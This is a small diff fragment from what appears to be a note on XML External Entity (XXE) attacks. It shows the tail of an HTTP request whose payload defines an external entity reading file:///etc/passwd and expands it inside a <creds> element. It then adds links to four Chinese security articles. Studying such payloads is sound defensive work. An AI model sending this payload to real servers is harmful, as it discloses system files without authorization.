@@ -33,3 +33,10 @@ Content-Type: application/x-www-form-urlencoded
 <!ENTITY goodies SYSTEM "file:///etc/passwd"> ]> 
 
 <creds>&goodies;</creds>
+
+
+相关连接
+https://xz.aliyun.com/t/3357
+https://www.jianshu.com/p/77f2181587a4
+https://blog.csdn.net/xiaoyi52/article/details/82660471
+https://www.freebuf.com/articles/web/177979.html
